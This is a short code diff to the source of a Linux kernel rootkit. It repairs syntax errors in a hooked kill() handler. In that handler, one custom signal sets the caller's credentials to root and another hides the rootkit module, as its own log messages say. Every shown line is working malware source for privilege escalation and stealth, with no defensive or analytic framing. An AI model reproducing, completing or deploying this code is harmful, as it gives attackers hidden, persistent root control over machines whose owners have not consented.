@@ -52,13 +52,13 @@ static asmlinkage long hook_kill(const struct pt_regs *regs){
     int sig = regs->si;
     void set_root(void);
     void hide_me(void);
-    void show_me(void)
+    void show_me(void);
 
     if(sig == SIGSUPER){
         printk(KERN_INFO "signal: %d == SIGSUPER %d | giving root privilges", sig, SIGSUPER);
         set_root();
         return 0;
-    }else if(sig == SIGINVIS && (hidden) == 0){}
+    }else if(sig == SIGINVIS && (hidden) == 0){
         printk(KERN_INFO "signal: %d == SIGINVIS %d | hiding the rootkit", sig, SIGINVIS);
         hide_me();
         hidden = 1;
@@ -101,7 +101,7 @@ static asmlinkage long hook_kill(pid_t pid, int sig){
         printk(KERN_INFO "signal: %d == SIGSUPER %d | giving root priveliges", sig, SIGSUPER);
         set_root();
         return 0;
-    }else if(sig == SIGINVIS && (hidden) == 0){}
+    }else if(sig == SIGINVIS && (hidden) == 0){
         printk(KERN_INFO "signal: %d == SIGINVIS %d | hiding the rootkit", sig, SIGINVIS);
         hide_me();
         hidden = 1;
